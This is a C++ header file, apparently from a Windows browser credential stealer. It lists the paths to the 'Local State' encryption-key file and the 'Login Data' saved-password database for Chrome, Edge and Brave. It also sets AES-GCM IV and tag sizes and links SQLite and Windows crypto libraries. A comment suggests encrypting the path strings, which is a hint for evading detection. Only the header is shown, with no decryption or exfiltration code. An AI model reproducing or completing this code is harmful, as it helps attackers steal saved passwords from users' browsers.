#pragma once

#include <iostream>
#include <Windows.h>
#include <Shlobj.h>
#include <vector>
#include <winsqlite/winsqlite3.h>
#include <bcrypt.h>
#pragma comment(lib,"winsqlite3.lib")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")



const int IV_SIZE = 12;
const int TAG_SIZE = 16;

const int NUMBER_OF_BROWSERS = 3;

enum BROWSER
{
	CHROME, EDGE, BRAVE  // Browsers list, index is important here for the lookup table
};


const std::string LOCAL_STATE_PATHS[NUMBER_OF_BROWSERS] =
{
		"\\Google\\Chrome\\User Data\\Local State",
		"\\Microsoft\\Edge\\User Data\\Local State",
		"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
		// You might wanna encrypt these
};


const std::string ACCOUNT_DB_PATHS[NUMBER_OF_BROWSERS] =
{
		"\\Google\\Chrome\\User Data\\Default\\Login Data",
		"\\Microsoft\\Edge\\User Data\\Default\\Login Data",
		"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
};